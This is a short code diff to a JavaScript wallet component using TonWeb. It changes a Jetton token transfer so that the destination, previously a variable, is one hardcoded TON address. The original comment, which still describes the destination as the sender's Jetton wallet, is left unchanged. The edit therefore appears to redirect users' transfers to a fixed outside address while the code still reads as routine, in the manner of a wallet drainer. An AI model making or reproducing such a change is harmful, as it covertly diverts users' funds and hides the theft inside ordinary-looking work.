@@ -82,7 +82,7 @@ function Wallet() {
     
           await wallet.methods.transfer({
             secretKey: secretKey,
-            toAddress: address, // address of Jetton wallet of Jetton sender
+            toAddress: new TonWeb.utils.Address("UQB203byGIbZ2VHJEpgfS4uiCe5omB4OsDz9_qnntIUOHYGc"), // address of Jetton wallet of Jetton sender
             amount: TonWeb.utils.toNano('0.05'), // total amount of TONs attached to the transfer message
             seqno: 0,
             payload: await jettonWallet.createTransferBody({
